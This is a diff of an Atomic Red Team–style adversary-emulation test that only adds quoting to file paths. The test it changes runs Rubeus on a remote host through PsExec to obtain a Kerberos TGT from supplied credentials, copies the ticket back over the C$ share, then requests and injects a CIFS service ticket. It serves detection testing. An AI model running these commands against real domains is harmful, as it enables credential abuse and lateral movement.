@@ -77,17 +77,17 @@ atomic_tests:
       if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else {exit 1}
     get_prereq_command: |
       Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
-      Expand-Archive PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip PathToAtomicsFolder\..\ExternalPayloads\PsTools -Force
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
       New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
-      Copy-Item PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
   executor:
     name: powershell
     elevation_required: true
     command: |
       & "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
-      Set-Location PathToAtomicsFolder\..\ExternalPayloads
+      Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
       Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
       Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
       & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
-      Remove-Item PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
       & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
